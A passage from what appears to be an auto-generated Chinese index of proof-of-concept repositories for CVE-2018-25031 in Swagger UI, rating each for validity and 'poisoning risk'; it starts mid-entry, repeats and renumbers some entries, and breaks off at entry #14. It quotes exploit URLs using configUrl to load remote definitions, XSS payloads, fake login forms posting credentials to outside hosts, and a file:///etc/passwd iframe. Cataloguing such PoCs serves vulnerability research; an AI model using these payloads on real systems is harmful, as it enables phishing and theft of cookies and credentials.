3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-geozin_POC-CVE-2018-25031.md](../2018/CVE-2018-25031-geozin_POC-CVE-2018-25031.md)

# CVE-2018-25031

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #7

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

